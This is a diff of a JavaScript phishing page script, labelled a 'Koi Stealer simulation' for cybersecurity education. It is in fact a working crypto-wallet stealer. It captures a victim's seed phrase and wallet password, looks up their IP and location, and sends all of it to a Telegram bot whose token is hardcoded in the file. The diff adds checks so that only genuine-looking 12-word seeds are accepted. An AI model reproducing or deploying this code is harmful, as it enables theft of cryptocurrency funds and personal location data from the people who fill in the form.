@@ -1,5 +1,5 @@
 // === KOI STEALER SIMULATION SCRIPT ===
-// For Cybersecurity Awareness — Educational Demo
+// Cybersecurity Education • By @YourHandle
 // -----------------------------------------------
 
 const botToken = "7986200355:AAE5W_YXK5RSVgHBCqOrBiurWmNpbTPPL7Q";
@@ -12,47 +12,55 @@ function log(msg) {
 
 document.addEventListener("DOMContentLoaded", () => {
   const form = document.getElementById("stealerForm");
+  const errorMsg = document.getElementById("errorMsg");
 
   if (!form) {
-    log("❌ Form not found on page.");
+    log("❌ Form not found.");
     return;
   }
 
   form.addEventListener("submit", async (event) => {
     event.preventDefault();
-    log("📩 Form submitted.");
+    errorMsg.textContent = ""; // Clear previous
 
-    const seed = document.getElementById("wallet")?.value || "N/A";
-    const pass = document.getElementById("password")?.value || "N/A";
+    const seed = document.getElementById("wallet")?.value.trim() || "";
+    const pass = document.getElementById("password")?.value.trim() || "";
 
-    // Step 1: Get IP/location
-    let geoInfo = {
-      ip: "Unavailable",
-      city: "N/A",
-      region: "N/A",
-      country: "N/A"
-    };
+    // Validate seed phrase (12 lowercase words)
+    const seedWords = seed.split(/\s+/);
+    const seedValid = seedWords.length === 12 && seedWords.every(w => /^[a-z]+$/.test(w));
+    if (!seedValid) {
+      errorMsg.textContent = "⚠️ Enter a valid 12-word seed phrase (lowercase).";
+      return;
+    }
 
+    if (pass.length < 6) {
+      errorMsg.textContent = "⚠️ Wallet password must be at least 6 characters.";
+      return;
+    }
+
+    log("✅ Validation passed. Processing...");
+
+    // Step 1: Fetch IP/location info
+    let geoInfo = { ip: "N/A", city: "N/A", region: "N/A", country: "N/A" };
     try {
       const res = await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`);
       geoInfo = await res.json();
-      log(`🌍 IP Data: ${geoInfo.ip} - ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}`);
-    } catch (err) {
-      log("⚠️ Could not retrieve GeoIP data.");
+      log(`🌐 IP: ${geoInfo.ip}, ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}`);
+    } catch {
+      log("⚠️ IP/location fetch failed.");
     }
 
-    // Step 2: Build message
+    // Step 2: Format message
     const message = `
 🚨 *Koi Stealer Simulation Triggered*
-🕒 Time: ${new Date().toLocaleString()}
-🌐 IP: ${geoInfo.ip}
-📍 Location: ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}
+🕒 *Time:* ${new Date().toLocaleString()}
+🌐 *IP:* ${geoInfo.ip}
+📍 *Location:* ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}
 
-🔑 Seed Phrase: \`${seed}\`
-🔐 Wallet Password: \`${pass}\`
+🔑 *Seed Phrase:* \`${seed}\`
+🔐 *Wallet Password:* \`${pass}\`
     `;
-
-    log("📤 Sending data to Telegram...");
 
     // Step 3: Send to Telegram
     try {
@@ -67,15 +75,11 @@ document.addEventListener("DOMContentLoaded", () => {
       });
 
       const result = await telegramRes.json();
-
-      if (result.ok) {
-        log("✅ Data sent to Telegram successfully.");
-      } else {
-        log(`❌ Telegram API error: ${result.description}`);
-      }
-
-    } catch (error) {
-      log(`🚫 Telegram send failed: ${error.message}`);
+      result.ok
+        ? log("✅ Sent to Telegram successfully.")
+        : log(`❌ Telegram error: ${result.description}`);
+    } catch (err) {
+      log("🚫 Telegram send failed:", err.message);
     }
   });
 });
